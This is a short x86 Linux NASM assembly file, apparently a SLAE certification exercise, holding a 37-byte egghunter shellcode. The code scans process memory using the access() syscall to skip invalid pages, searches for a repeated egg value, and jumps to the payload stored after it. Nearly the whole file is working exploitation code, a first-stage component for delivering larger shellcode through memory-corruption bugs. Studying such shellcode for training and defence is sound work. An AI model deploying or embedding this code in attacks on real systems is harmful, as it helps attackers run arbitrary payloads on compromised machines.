;
; Linux x86
; Author:  thryb
; Date:    02-08-16
; Purpose: Egghunter shellcode
; Size:    37 bytes
; ID:      SLAE-770
; Git:     https://www.github.com/thryb/SLAE-770
;

global _start
section .text

_start:

xor ebx, ebx ; cleanup
xor ecx, ecx ; cleanup

mem_align:
    or bx,0xfff         ; 0xfff 
find_egg:
    inc ebx		; 0x1000 
    lea edx, [ebx+0x4]  ; load effective address of ebx+4
    push byte 0x21      ; sys_access()
    pop eax             ; pop sys_access() into eax
    int 0x80            ; init
			; #define EFAULT          14      // Bad address
    cmp al, 0xf2  	; EFAULT return FFFFFFF2 on unaccessible address 
    jz mem_align        ; jmp to mem_align if pointer is invalid
    mov eax, 0x91919191 ; put the egg in eax
    mov edi, ebx        ; mov addres into edi
    scasd               ; compare eax / edi and increment edi by 4
    jnz find_egg        ; if not zero (not matched) try next address
    scasd               ; if zero (4bytes match) try the next 4
    jnz find_egg        ; if not zero (not matched) try next address
    jmp edi             ; jmmp to payload when everything is matched.;

